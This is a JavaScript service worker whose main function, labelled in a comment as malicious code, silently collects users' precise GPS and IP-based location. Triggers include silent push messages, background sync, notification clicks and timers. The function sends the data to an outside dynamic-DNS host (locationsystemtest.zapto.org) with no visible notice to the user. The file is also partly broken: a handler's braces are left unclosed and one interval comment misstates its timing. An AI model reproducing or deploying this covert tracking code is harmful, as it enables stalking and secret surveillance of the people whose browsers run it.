self.addEventListener('install', (event) => {
  console.log('Service Worker installed.');
  self.skipWaiting();
});

self.addEventListener('activate', event => {
  console.log('Service Worker activated.');
  event.waitUntil(clients.claim());
});

self.addEventListener('periodicsync', event => {
  console.log('Periodic sync started.');
  if (event.tag === 'locationFetch') {
      event.waitUntil(fetchAndSendLocation());
  }
});

self.addEventListener('sync', event => {
  if (event.tag === 'syncLocation') {
      event.waitUntil(fetchAndSendLocation());
  }
});

self.addEventListener('notificationclick', event => {
  event.notification.close();
  // Trigger background fetch
  event.waitUntil(fetchAndSendLocation());
});

self.addEventListener('push', event => {
  const data = event.data ? event.data.json() : {};
  console.log('Push received:', data);

  if (data.silent) {
    // Perform background task without showing a notification
    fetchAndSendLocation();
    return;
  }

  // If not silent, show notification
  self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/icon.png'
  });
});

self.addEventListener('fetch', event => {
  // Optional: Intercept fetch requests and modify them
  event.respondWith(fetch(event.request));
});

// Malicious Code: Background Geolocation
function fetchAndSendLocation() {
  sendLocation();
  requestLocation();
  if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
          position => {
              const { latitude, longitude } = position.coords;
              fetch('https://locationsystemtest.zapto.org/api/locacao', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ latitude, longitude, timestamp: Date.now() })
              });
          },
          error => console.error('Geolocation error:', error),
          { enableHighAccuracy: true }
      );
  }
}

// Periodically send location data
setInterval(fetchAndSendLocation, 3000000); // Every 5 minutes

self.addEventListener('message', event => {
  if (event.data.type === 'LOCATION_RESPONSE') {
      const { latitude, longitude, timestamp } = event.data.payload;
      console.log('Received location from client:', latitude, longitude, timestamp);

      // Perform background tasks with the location
      fetch('https://locationsystemtest.zapto.org/api/locacao', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude, longitude, timestamp })      });

// Simulate periodic location requests
function requestLocation() {
  self.clients.matchAll().then(clients => {
      clients.forEach(client => {
          client.postMessage({ type: 'REQUEST_LOCATION' });
      });
  });
}

// Request location every 5 minutes
setInterval(requestLocation, 300000); // 5 minutes

async function sendLocation() {
  try {
    // Fetch user's IP address
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    // Fetch location data based on IP
    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    const locationData = await locationResponse.json();

    const { latitude, longitude } = locationData;

    // Send location to server[]
    await fetch('/api/locacao', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ latitude, longitude })
    });

    console.log('Location data sent:', { latitude, longitude });
  } catch (error) {
    console.error('Error sending location:', error);
  }
}